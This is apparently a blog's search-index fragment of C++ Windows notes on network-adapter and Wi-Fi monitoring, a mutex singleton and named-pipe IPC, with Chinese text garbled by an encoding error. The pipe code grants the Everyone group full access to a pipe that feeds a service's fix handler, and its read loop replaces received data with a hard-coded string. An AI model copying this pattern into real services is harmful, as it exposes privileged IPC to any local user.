continue; &#125; */ ConnectionInfo item; GUID guid; INetwork* network; BSTR strNetWorkName = nullptr; if (SUCCEEDED(connection-&gt;GetNetwork(&amp;network)) &amp;&amp; network != nullptr) &#123; network-&gt;GetName(&amp;strNetWorkName); &#125; std::string strName = _com_util::ConvertBSTRToString(strNetWorkName); if (strName.compare(&quot;TrustAgent VNIC&quot;) != 0) &#123; continue; &#125; // è·å– GUID connection-&gt;GetAdapterId(&amp;guid); item.guid = GUIDToString(guid); result.push_back(item); &#125; if (connection) &#123; connection-&gt;Release(); &#125; &#125; for (auto it = result.begin(); it != result.end(); ++it) &#123; it-&gt;type = GetNetAdpaterType(it-&gt;guid); &#125; std::partition(result.begin(), std::partition(result.begin(), result.end(), [](const ConnectionInfo&amp; info) &#123; return info.type != NetworkType::NotNetwork; &#125;), [](const ConnectionInfo&amp; info) &#123; return info.type == NetworkType::Ethernet; &#125;); for (auto it = result.begin(); it != result.end(); ++it) &#123; std::wcout &lt;&lt; &quot;connect network guid : &quot; &lt;&lt; it-&gt;guid &lt;&lt; &quot; | type : &quot; &lt;&lt; it-&gt;type &lt;&lt; std::endl; &#125; return result;&#125;NetworkType NetworkMonitor::GetNetAdpaterType(const std::wstring&amp; guid)&#123; unsigned long unSize = sizeof(IP_ADAPTER_INFO); std::unique_ptr&lt;uint8_t[]&gt; data = std::make_unique&lt;uint8_t[]&gt;(unSize); bool find = false; unsigned long unResult = GetAdaptersInfo(reinterpret_cast&lt;PIP_ADAPTER_INFO&gt;(data.get()), &amp;unSize); if (ERROR_BUFFER_OVERFLOW == unResult) &#123; data = std::make_unique&lt;uint8_t[]&gt;(unSize); unResult = GetAdaptersInfo(reinterpret_cast&lt;PIP_ADAPTER_INFO&gt;(data.get()), &amp;unSize); &#125; if (ERROR_SUCCESS == unResult) &#123; PIP_ADAPTER_INFO pIpAdapterInfo = reinterpret_cast&lt;PIP_ADAPTER_INFO&gt;(data.get()); while (pIpAdapterInfo) &#123; if (UnicodeToUTF8(guid) == pIpAdapterInfo-&gt;AdapterName) &#123; return MIB_IF_TYPE_ETHERNET == pIpAdapterInfo-&gt;Type ? NetworkType::Ethernet : IF_TYPE_IEEE80211 == pIpAdapterInfo-&gt;Type ? NetworkType::Wlan : NetworkType::NotNetwork; &#125; pIpAdapterInfo = pIpAdapterInfo-&gt;Next; &#125; &#125; return NetworkType::NotNetwork;&#125;void NetworkMonitor::OnNetworkStatusChange()&#123; ShowNetworkStatus();&#125;WiFiQuality NetworkMonitor::GetWiFiSignalQuality(const std::wstring&amp; guid)&#123; WiFiQuality result = WiFiQuality::Weak; DWORD dwMaxClient = 2; DWORD dwCurVersion = 0; DWORD dwResult = 0; unsigned int i, j; PWLAN_INTERFACE_INFO_LIST pIfList = NULL; PWLAN_INTERFACE_INFO pIfInfo = NULL; PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL; PWLAN_AVAILABLE_NETWORK pBssEntry = NULL; int iRSSI = 0; if (_wlanHandle == NULL) &#123; dwResult = WlanOpenHandle(dwMaxClient, NULL, &amp;dwCurVersion, &amp;_wlanHandle); if (dwResult != ERROR_SUCCESS) &#123; std::cerr &lt;&lt; &quot;WlanOpenHandle failed with error: &quot; &lt;&lt; dwResult &lt;&lt; std::endl; return result; &#125; dwResult = WlanRegisterNotification(_wlanHandle, WLAN_NOTIFICATION_SOURCE_ALL, TRUE, WLAN_NOTIFICATION_CALLBACK(OnNotificationCallback), NULL, NULL, NULL); if (dwResult != ERROR_SUCCESS) &#123; std::cerr &lt;&lt; &quot;WlanRegisterNotification failed with error: &quot; &lt;&lt; dwResult &lt;&lt; std::endl; return result; &#125; &#125; dwResult = WlanEnumInterfaces(_wlanHandle, NULL, &amp;pIfList); if (dwResult != ERROR_SUCCESS) &#123; std::cerr &lt;&lt; &quot;WlanEnumInterfaces failed with error: &quot; &lt;&lt; dwResult &lt;&lt; std::endl; return result; &#125; for (i = 0; i &lt; (int)pIfList-&gt;dwNumberOfItems; i++) &#123; pIfInfo = (WLAN_INTERFACE_INFO*)&amp;pIfList-&gt;InterfaceInfo[i]; if (guid != GUIDToString(pIfInfo-&gt;InterfaceGuid) || pIfInfo-&gt;isState != wlan_interface_state_connected) &#123; continue; &#125; dwResult = WlanGetAvailableNetworkList(_wlanHandle, &amp;pIfInfo-&gt;InterfaceGuid, 0, NULL, &amp;pBssList); if (dwResult != ERROR_SUCCESS) &#123; std::cerr &lt;&lt; &quot;WlanGetAvailableNetworkList failed with error:&quot; &lt;&lt; dwResult &lt;&lt; std::endl; return result; &#125; for (j = 0; j &lt; pBssList-&gt;dwNumberOfItems; j++) &#123; pBssEntry = (WLAN_AVAILABLE_NETWORK*)&amp;pBssList-&gt;Network[j]; if (pBssEntry-&gt;bNetworkConnectable &amp;&amp; (pBssEntry-&gt;dwFlags &amp; WLAN_AVAILABLE_NETWORK_CONNECTED)) &#123; if (pBssEntry-&gt;wlanSignalQuality == 0) iRSSI = -100; else if (pBssEntry-&gt;wlanSignalQuality == 100) iRSSI = -50; else iRSSI = -100 + (pBssEntry-&gt;wlanSignalQuality / 2); std::cout &lt;&lt; &quot;Signal Quality:\\t &quot; &lt;&lt; pBssEntry-&gt;wlanSignalQuality &lt;&lt; &quot; (RSSI: &quot; &lt;&lt; iRSSI &lt;&lt; &quot; dBm)&quot; &lt;&lt; std::endl; result = iRSSI &lt; -70 ? WiFiQuality::Weak : iRSSI &lt; -60 ? WiFiQuality::Fair : iRSSI &lt; -50 ? WiFiQuality::Good : WiFiQuality::Excellent; &#125; &#125; &#125; if (pBssList != NULL) &#123; WlanFreeMemory(pBssList); pBssList = NULL; &#125; if (pIfList != NULL) &#123; WlanFreeMemory(pIfList); pIfList = NULL; &#125; return result;&#125;void NetworkMonitor::OnWiFiQualityChange(const GUID&amp; guid)&#123; auto nowQuality = GetWiFiSignalQuality(GUIDToString(guid)); std::cout &lt;&lt; &quot;WiFi signal quality now : &quot; &lt;&lt; nowQuality &lt;&lt; std::endl; ShowNetworkStatus();&#125;void NetworkMonitor::ShowNetworkStatus()&#123; NetworkType type; WiFiQuality quality; auto connections = GetNetworkConnections(); if (connections.empty()) &#123; type = NetworkType::NotNetwork; &#125; else &#123; type = connections.front().type; if (type == NetworkType::Wlan) &#123; quality = GetWiFiSignalQuality(connections.front().guid); &#125; &#125; std::cout &lt;&lt; &quot;====== Notify ======&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;* Type : &quot; &lt;&lt; (type == NetworkType::NotNetwork ? &quot;NetworkError&quot; : type == NetworkType::Ethernet ? &quot;Ethernet&quot; : &quot;WiFi&quot;) &lt;&lt; std::endl; if (type == NetworkType::Wlan) &#123; std::cout &lt;&lt; &quot;* Signal : &quot; &lt;&lt; quality + 1 &lt;&lt; std::endl; &#125; std::cout &lt;&lt; std::endl;&#125;int main()&#123; InstanceOfNetworkMonitor()-&gt;ShowNetworkStatus(); while (true) std::this_thread::sleep_for(std::chrono::hours(10)); return 0;&#125; ä½¿ç”¨ç¤ºä¾‹2 ç›‘æ§ç½‘ç»œè¿æ¥çŠ¶æ€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#include &lt;netlistmgr.h&gt;#include &quot;sp_log.h&quot;#include &lt;atomic&gt;#include &lt;thread&gt;#include &lt;mutex&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;netcon.h&gt;#include &lt;Shlwapi.h&gt;#include &lt;TLHELP32.H&gt;#include &lt;UserEnv.h&gt;#include &lt;iphlpapi.h&gt;#pragma comment(lib,&quot;shlwapi.lib&quot;)#pragma comment(lib,&quot;Iphlpapi.lib&quot;)class CNetworkListManagerEvent : public INetworkListManagerEvents&#123;public: CNetworkListManagerEvent(std::function&lt;void(bool)&gt; netChangedHandler) : m_ref(1) , netChangedHandler_(netChangedHandler) &#123; &#125; ~CNetworkListManagerEvent() &#123; &#125; HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) &#123; HRESULT Result = S_OK; if (IsEqualIID(riid, IID_IUnknown)) &#123; *ppvObject = (IUnknown*)this; &#125; else if (IsEqualIID(riid, IID_INetworkListManagerEvents)) &#123; *ppvObject = (INetworkListManagerEvents*)this; &#125; else &#123; Result = E_NOINTERFACE; &#125; return Result; &#125; ULONG STDMETHODCALLTYPE AddRef() &#123; return (ULONG)InterlockedIncrement(&amp;m_ref); &#125; ULONG STDMETHODCALLTYPE Release() &#123; LONG Result = InterlockedDecrement(&amp;m_ref); if (Result == 0) delete this; return (ULONG)Result; &#125; virtual HRESULT STDMETHODCALLTYPE ConnectivityChanged( /* [in] */ NLM_CONNECTIVITY newConnectivity) &#123; if (newConnectivity == NLM_CONNECTIVITY_DISCONNECTED) &#123; SP_DEV_LOGT(&quot;internet status changed. connect closed&quot;); // ç½‘ç»œæ–­å¼€ netChangedHandler_(false); &#125; else if ((newConnectivity &amp; NLM_CONNECTIVITY_IPV4_INTERNET) || (newConnectivity &amp; NLM_CONNECTIVITY_IPV6_INTERNET)) &#123; SP_DEV_LOGT(&quot;internet status changed. connect success&quot;); // ç½‘ç»œè¿æ¥æˆåŠŸ netChangedHandler_(true); &#125; return S_OK; &#125;private: LONG m_ref; std::function&lt;void(bool)&gt; netChangedHandler_;&#125;;class CNetworkMonitor&#123;public: CNetworkMonitor() &#123;&#125;; ~CNetworkMonitor() &#123;&#125;;private: // ç›‘æ§ç½‘ç»œçŠ¶æ€å˜åŒ– static void InitNetworkMonitor() &#123; SP_DEV_LOGT(&quot;InitNetworkMonitor&quot;); bool bSuccess = false; CoInitialize(NULL); // // é€šè¿‡NLAæ¥å£è·å–ç½‘ç»œçŠ¶æ€ // IUnknown* pUnknown = NULL; HRESULT Result = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_IUnknown, (void**)&amp;pUnknown); if (SUCCEEDED(Result)) &#123; INetworkListManager* pNetworkListManager = NULL; Result = pUnknown-&gt;QueryInterface(IID_INetworkListManager, (void**)&amp;pNetworkListManager); if (SUCCEEDED(Result)) &#123; VARIANT_BOOL IsConnect = VARIANT_FALSE; Result = pNetworkListManager-&gt;get_IsConnectedToInternet(&amp;IsConnect); if (SUCCEEDED(Result)) &#123; printf(&quot;connect to internet:%s&quot;, IsConnect == VARIANT_TRUE ? &quot;TRUE&quot; : &quot;FALSE&quot;); &#125; IConnectionPointContainer* pCPContainer = NULL; Result = pNetworkListManager-&gt;QueryInterface(IID_IConnectionPointContainer, (void**)&amp;pCPContainer); if (SUCCEEDED(Result)) &#123; IConnectionPoint* pConnectPoint = NULL; Result = pCPContainer-&gt;FindConnectionPoint(IID_INetworkListManagerEvents, &amp;pConnectPoint); if (SUCCEEDED(Result)) &#123; DWORD Cookie = NULL; CNetworkMonitor networkMonitor; std::function&lt;void(bool)&gt; monitorFunc = std::bind(&amp;CNetworkMonitor::NetworkStatusChangedCallback, networkMonitor, std::placeholders::_1); CNetworkListManagerEvent* pNetEvent = new(std::nothrow) CNetworkListManagerEvent(monitorFunc); if (pNetEvent) &#123; Result = pConnectPoint-&gt;Advise((IUnknown*)pNetEvent, &amp;Cookie); if (SUCCEEDED(Result)) &#123; printf(&quot;InitNetworkMonitor success&quot;); bSuccess = true; MSG msg; while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); if (msg.message == WM_QUIT) &#123; break; &#125; &#125; pConnectPoint-&gt;Unadvise(Cookie); pConnectPoint-&gt;Release(); &#125; &#125; &#125; pCPContainer-&gt;Release(); &#125; pNetworkListManager-&gt;Release(); &#125; pUnknown-&gt;Release(); &#125; CoUninitialize(); &#125; void NetworkStatusChangedCallback(bool status) &#123; g_bNetWorkOnline = status; if (status) &#123; if (g_sp_trust_model.get()) &#123; if (g_sp_trust_model-&gt;IsOnline()) &#123; //ä¼‘çœ å”¤é†’åç½‘ç»œè¿æ¥æˆåŠŸï¼Œè‡ªåŠ¨å‘é€ä¸€æ¬¡å¿ƒè·³ printf(&quot;Sleep wakes up and automatically triggers a heartbeat&quot;); &#125; else &#123; printf(&quot;No login, will not rebuild trust nc&quot;); &#125; &#125; else &#123; printf(&quot;rebuild trust nc - g_sp_trust_model is null&quot;); &#125; &#125; &#125;public: void StartMonitor() &#123; std::thread monitorThread(&amp;InitNetworkMonitor); monitorThread.detach(); &#125;&#125;;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ç³»ç»Ÿé”","date":"2023-10-27T01:24:02.069Z","path":"A_OS/Windows/API/ã€winapiã€‘ç³»ç»Ÿé”/","text":"æ¦‚è¿°ï¼šç³»ç»Ÿé”å°±æ˜¯åœ¨åˆ›å»ºå¥æŸ„ï¼Œå†æ¬¡åˆ›å»ºè¯¥å¥æŸ„æ—¶ï¼Œä¼šè¿”å›å¤±è´¥ [toc] ç³»ç»Ÿé” ç³»ç»Ÿé”å°±æ˜¯ä½¿ç”¨ CreateMutexA åˆ›å»ºä¸€ä¸ªå¥æŸ„ï¼Œåˆ›å»ºæˆåŠŸæ—¶ï¼Œå¥æŸ„ä¸ä¸ºç©ºã€‚å½“å†æ¬¡ä½¿ç”¨è¯¥é”çš„å‘½ååˆ›å»ºæ—¶ï¼Œå› ä¸ºå·²ç»åˆ›å»ºäº†ä¸€ä¸ªåŒåé”äº†ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±å®ç°äº†è¿›ç¨‹å¯åŠ¨ä¸€æ¬¡æˆ–è€…å‡½æ•°æ‰§è¡Œä¸€æ¬¡çš„é€»è¾‘ã€‚ ä»£ç  12345678910111213141516171819202122class WinSingleleton &#123;public: WinSingleleton(string name); ~WinSingleleton() &#123; if (_handle != INVALID_HANDLE_VALUE) &#123; CloseHandle(_handle); &#125; _handle = INVALID_HANDLE_VALUE; &#125;private: HANDLE _handle;&#125;;WinSingleleton::WinSingleleton(string name) :_handle(INVALID_HANDLE_VALUE)&#123; _handle = CreateMutexA(NULL, FALSE, name.c_str());&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"Windows/é”","slug":"Windows-é”","permalink":"https://hodlyounger.github.io/tags/Windows-%E9%94%81/"},{"name":"CPP/é”","slug":"CPP-é”","permalink":"https://hodlyounger.github.io/tags/CPP-%E9%94%81/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€Windowsã€‘ç®¡é“demo","date":"2023-10-27T01:24:02.069Z","path":"A_OS/Windows/API/ã€winapiã€‘ç®¡é“çš„ä½¿ç”¨/","text":"æ¦‚è¿°ï¼šWindows ç®¡é“åˆ›å»ºä¸ä½¿ç”¨ [toc] ç®¡é“ç±» .h 123456789101112131415161718192021222324252627282930313233343536373839#pragma once#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;memory&gt;#define TIME_ASECOND 1000enum PIPEUSERTYPE &#123; USER_CLIENT, //å®¢æˆ·ç«¯ USER_SERVER, //æœåŠ¡ç«¯&#125;;class PipeIPC &#123;public: explicit PipeIPC(PIPEUSERTYPE role) :m_Role(role), m_hPipeHandle(INVALID_HANDLE_VALUE) &#123;&#125;; ~PipeIPC(); bool WriteData(__in const std::string&amp; datas); //å†™å…¥æ•°æ® void Release(); bool ReadData(__out std::string&amp; datas, __out bool bIsPipeEnd); //è¯»å–æ•°æ® bool InitPipeIPC(); //åˆå§‹åŒ–ç®¡é“é€šä¿¡ bool IsInit(); BOOL InitSecurityAttributes(); void Connect(); void DisConnect();private: PIPEUSERTYPE m_Role; HANDLE m_hPipeHandle; SECURITY_ATTRIBUTES m_sec_attr; //security attributes &#125;; .cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230#include &quot;PipeIPC.h&quot;#include &lt;AccCtrl.h&gt;#include &lt;AclAPI.h&gt;using namespace std;#define PIPE_SERVER_NAME &quot;\\\\\\\\.\\\\pipe\\\\TrustAgent\\\\pipe.ToFixService&quot;#define PIPE_CLIENT_NAME &quot;\\\\\\\\.\\\\pipe\\\\TrustAgent\\\\pipe.ToTrustAgent&quot;PipeIPC::~PipeIPC()&#123; if (m_hPipeHandle != INVALID_HANDLE_VALUE) &#123; DisconnectNamedPipe(m_hPipeHandle); CloseHandle(m_hPipeHandle); &#125;&#125;bool PipeIPC::InitPipeIPC()&#123; if (USER_SERVER == m_Role &amp;&amp; nullptr != m_hPipeHandle) &#123; InitSecurityAttributes(); // cout &lt;&lt; &quot;ser&quot; &lt;&lt; endl; m_hPipeHandle = CreateNamedPipeA(PIPE_SERVER_NAME, PIPE_ACCESS_DUPLEX, //åŒå‘æ¨¡å¼ PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE/* | PIPE_NOWAIT*/, PIPE_UNLIMITED_INSTANCES,//è®¾ç½®æœ€å¤§å®¹çº³å®ä¾‹æ•°ç›® 0, 0, NULL, (LPSECURITY_ATTRIBUTES)&amp;m_sec_attr); //å¦‚æœç®¡é“åˆ›å»ºå¤±è´¥ if (m_hPipeHandle == INVALID_HANDLE_VALUE) &#123; return false; &#125;#if 0 if (!ConnectNamedPipe(m_hPipeHandle, nullptr)) &#123; cout &lt;&lt; &quot;ConnectNamedPipe failed&quot; &lt;&lt; endl; return false; &#125;#endif &#125; else &#123; if (WaitNamedPipeA(PIPE_CLIENT_NAME, TIME_ASECOND * 5) == FALSE) return 0; m_hPipeHandle = CreateFileA( PIPE_CLIENT_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //å¦‚æœç®¡é“åˆ›å»ºå¤±è´¥ if (m_hPipeHandle == INVALID_HANDLE_VALUE) &#123; return false; &#125; WriteData(&quot;[PIPE] ------ V10 Init ------&quot;); &#125; return true;&#125;bool PipeIPC::IsInit()&#123; return m_hPipeHandle == INVALID_HANDLE_VALUE ? false : true;&#125;/* [details] åˆ›å»ºç®¡é“å»ç®¡ç†å‘˜æƒé™*/BOOL PipeIPC::InitSecurityAttributes()&#123; PSID pEveryoneSID = NULL; PACL pACL = NULL; EXPLICIT_ACCESS ea; PSECURITY_DESCRIPTOR pSD = NULL; void* ea_addr = NULL; void* acl_addr = NULL; void* sd_addr = NULL; SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY; if (!AllocateAndInitializeSid(&amp;SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &amp;pEveryoneSID)) &#123; return FALSE; &#125; ZeroMemory(&amp;ea, sizeof(EXPLICIT_ACCESS)); ea.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL; ea.grfAccessMode = SET_ACCESS; ea.grfInheritance = NO_INHERITANCE; ea.Trustee.TrusteeForm = TRUSTEE_IS_SID; ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP; ea.Trustee.ptstrName = (LPTSTR)pEveryoneSID; ea_addr = &amp;ea; if (ERROR_SUCCESS != SetEntriesInAcl(1, &amp;ea, NULL, &amp;pACL)) &#123; goto cleanup; &#125; acl_addr = &amp;pACL; pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH); if (NULL == pSD) &#123; goto cleanup; &#125; if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION)) &#123; goto cleanup; &#125; sd_addr = &amp;pSD; if (!SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE)) &#123; goto cleanup; &#125; m_sec_attr.nLength = sizeof(SECURITY_ATTRIBUTES); m_sec_attr.lpSecurityDescriptor = pSD; m_sec_attr.bInheritHandle = FALSE; return TRUE;cleanup: if (pEveryoneSID) FreeSid(pEveryoneSID); if (pACL) LocalFree(pACL); if (pSD) LocalFree(pSD); return FALSE;&#125;void PipeIPC::Connect()&#123; ConnectNamedPipe(m_hPipeHandle, nullptr);&#125;void PipeIPC::DisConnect()&#123; DisconnectNamedPipe(m_hPipeHandle);&#125;//è¯»å–æ•°æ®bool PipeIPC::ReadData(__out std::string&amp; datas, __out bool bIsPipeEnd)&#123; if (INVALID_HANDLE_VALUE == m_hPipeHandle || nullptr == m_hPipeHandle) &#123; InitPipeIPC(); &#125; DWORD cbRead = 0;//å®šä¹‰æ•°æ®é•¿åº¦ DWORD cbData = 0; if (ReadFile(m_hPipeHandle, &amp;cbData, sizeof(cbData), &amp;cbRead, nullptr) &amp;&amp; sizeof(cbData) == cbRead) &#123; DWORD error = GetLastError(); bIsPipeEnd = (error == ERROR_BROKEN_PIPE ? true : false); datas.resize(cbData); if (ReadFile(m_hPipeHandle, (LPVOID)datas.data(), cbData, &amp;cbRead, nullptr) &amp;&amp; cbData == cbRead) &#123; return true; &#125; &#125; else &#123; DWORD dwError = GetLastError(); bIsPipeEnd = (dwError == ERROR_BROKEN_PIPE) ? true : false; &#125; datas.resize(0); return false;&#125;//å†™å…¥æ•°æ®bool PipeIPC::WriteData(__in const std::string&amp; datas)&#123; if (m_Role == USER_SERVER) &#123; bool connect = ConnectNamedPipe(m_hPipeHandle, NULL); if (!connect) &#123; if (!InitPipeIPC()) &#123; DWORD error = GetLastError(); if (error != ERROR_PIPE_CONNECTED) &#123; //cout &lt;&lt; &quot;å®¢æˆ·ç«¯è¿˜æ²¡è¿æ¥&quot; &lt;&lt; endl; //è¿æ¥å¤±è´¥ return false; &#125; &#125; &#125; &#125; if (!IsInit()) &#123; if (!InitPipeIPC()) &#123; return false; &#125; &#125; //è¿æ¥æˆåŠŸï¼ DWORD wLen; const DWORD cbData = datas.size() * sizeof(datas[0]); if (!WriteFile(m_hPipeHandle, &amp;cbData, sizeof(cbData), &amp;wLen, NULL)) &#123; return false; &#125; if (!WriteFile(m_hPipeHandle, datas.c_str(), datas.size() * sizeof(datas[0]), &amp;wLen, NULL)) &#123; return false; &#125; return true;&#125;void PipeIPC::Release()&#123; if (m_hPipeHandle) &#123; DisconnectNamedPipe(m_hPipeHandle); CloseHandle(m_hPipeHandle); // å…³é—­å¥æŸ„ m_hPipeHandle = NULL; &#125;&#125; å®šä¹‰ä¸å£°æ˜ 12__declspec(selectany) PipeIPC* pRead = new PipeIPC(USER_SERVER);__declspec(selectany) PipeIPC* pWrite = new PipeIPC(USER_CLIENT); ä½¿ç”¨ ç›‘å¬ç®¡é“ éšç¨‹åºåŒæ—¶å¯åŠ¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 BOOL StartPipeRead()&#123; EventLog(LOG_ALL, &quot;[IPC][THREAD] ,Create PipeReadThread Success, pipe = %p&quot;, pRead ); EventLog(LOG_ALL, &quot;pipe = %p, pipe-&gt;IsInit()=%d&quot;, pRead, pRead-&gt;IsInit()); bool isPipeEnd = true; while (true) &#123; if (isPipeEnd) &#123; pRead-&gt;Connect(); &#125; std::string datas; if (!pRead-&gt;ReadData(datas, isPipeEnd)) &#123; if (isPipeEnd) &#123; EventLog(LOG_ALL, &quot;-----------[PIPE END]----------&quot;); pRead-&gt;DisConnect(); &#125; &#125; datas = &quot;Add&quot;; // æ•°æ®å¤„ç† if (datas.find(&quot;start&quot;) != std::string::npos) // å¯åŠ¨æˆåŠŸ &#123; EventLog(LOG_ALL, &quot; [PIPE] [REC] TrustAgentStart&quot;); // å¯åŠ¨ ç®¡é“å®¢æˆ·ç«¯ if (!StartPipeWrite()) &#123; EventLog(LOG_ALL, &quot; [PIPE] Failed to Create Client Pipe, GetLastError()=&quot;, GetLastError()); &#125; &#125; else if (!datas.empty()) &#123; EventLog(LOG_ALL, &quot;[PIPE] [RECV] datas: %s&quot;, datas.c_str()); // è°ƒç”¨å¯¼å‡ºçš„æ¥å£ &#123; std::thread th(HandleFix, datas); th.detach(); &#125; // NSPTRUST::SendRpcMsgToPlugin(POLICY_SENDTQA_USER, datas.c_str()); &#125; &#125;&#125; å†™ç®¡é“ å¯åŠ¨æ—¶æœºï¼ŒåŒåç®¡é“çš„ç›‘å¬ç®¡é“å¯åŠ¨åå†å¯åŠ¨ 1234567BOOL StartPipeWrite()&#123; if (pWrite-&gt;IsInit()) return true; else return pWrite-&gt;InitPipeIPC();&#125; å†™æ•°æ® 12std::string datas = &quot;Send data to PIPE Read&quot;;pWrite-&gt;WriteData(datas);","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€Windowsã€‘ç›‘æ§ç³»ç»Ÿäº‹ä»¶ï¼ˆç½‘å¡ï¼‰","date":"2023-10-27T01:24:02.068Z","path":"A_OS/Windows/API/ã€winapiã€‘ç›‘æ§ç³»ç»Ÿäº‹ä»¶/","text":"æ¦‚è¿°ï¼šç›‘æ§ç³»ç»Ÿäº‹ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202#pragma once#include &lt;netlistmgr.h&gt;#include &lt;atomic&gt;std::atomic_bool g_bNetWorkOnline(true);class CNetworkListManagerEvent : public INetworkListManagerEvents&#123;public: CNetworkListManagerEvent(std::function&lt;void(bool)&gt; netChangedHandler) : m_ref(1) , netChangedHandler_(netChangedHandler) &#123; &#125; ~CNetworkListManagerEvent() &#123; &#125; HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) &#123; HRESULT Result = S_OK; if (IsEqualIID(riid, IID_IUnknown)) &#123; *ppvObject = (IUnknown*)this; &#125; else if (IsEqualIID(riid, IID_INetworkListManagerEvents)) &#123; *ppvObject = (INetworkListManagerEvents*)this; &#125; else &#123; Result = E_NOINTERFACE; &#125; return Result; &#125; ULONG STDMETHODCALLTYPE AddRef() &#123; return (ULONG)InterlockedIncrement(&amp;m_ref); &#125; ULONG STDMETHODCALLTYPE Release() &#123; LONG Result = InterlockedDecrement(&amp;m_ref); if (Result == 0) delete this; return (ULONG)Result; &#125; virtual HRESULT STDMETHODCALLTYPE ConnectivityChanged( /* [in] */ NLM_CONNECTIVITY newConnectivity) &#123; if (newConnectivity == NLM_CONNECTIVITY_DISCONNECTED) &#123; SP_DEV_LOGT(&quot;internet status changed. connect closed&quot;); // ç½‘ç»œæ–­å¼€ netChangedHandler_(false); &#125; else if ((newConnectivity &amp; NLM_CONNECTIVITY_IPV4_INTERNET) || (newConnectivity &amp; NLM_CONNECTIVITY_IPV6_INTERNET)) &#123; SP_DEV_LOGT(&quot;internet status changed. connect success&quot;); // ç½‘ç»œè¿æ¥æˆåŠŸ netChangedHandler_(true); &#125; return S_OK; &#125;private: LONG m_ref; std::function&lt;void(bool)&gt; netChangedHandler_;&#125;;class CNetworkMonitor&#123;public: CNetworkMonitor() &#123;&#125;; ~CNetworkMonitor() &#123;&#125;;private: // ç›‘æ§ç½‘ç»œçŠ¶æ€å˜åŒ– static void InitNetworkMonitor() &#123; SP_DEV_LOGT(&quot;InitNetworkMonitor&quot;); bool bSuccess = false; CoInitialize(NULL); // // é€šè¿‡NLAæ¥å£è·å–ç½‘ç»œçŠ¶æ€ // IUnknown* pUnknown = NULL; HRESULT Result = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_IUnknown, (void**)&amp;pUnknown); if (SUCCEEDED(Result)) &#123; INetworkListManager* pNetworkListManager = NULL; Result = pUnknown-&gt;QueryInterface(IID_INetworkListManager, (void**)&amp;pNetworkListManager); if (SUCCEEDED(Result)) &#123; VARIANT_BOOL IsConnect = VARIANT_FALSE; Result = pNetworkListManager-&gt;get_IsConnectedToInternet(&amp;IsConnect); if (SUCCEEDED(Result)) &#123; SP_DEV_LOGT(&quot;connect to internet:%s&quot;, IsConnect == VARIANT_TRUE ? &quot;TRUE&quot; : &quot;FALSE&quot;); &#125; IConnectionPointContainer* pCPContainer = NULL; Result = pNetworkListManager-&gt;QueryInterface(IID_IConnectionPointContainer, (void**)&amp;pCPContainer); if (SUCCEEDED(Result)) &#123; IConnectionPoint* pConnectPoint = NULL; Result = 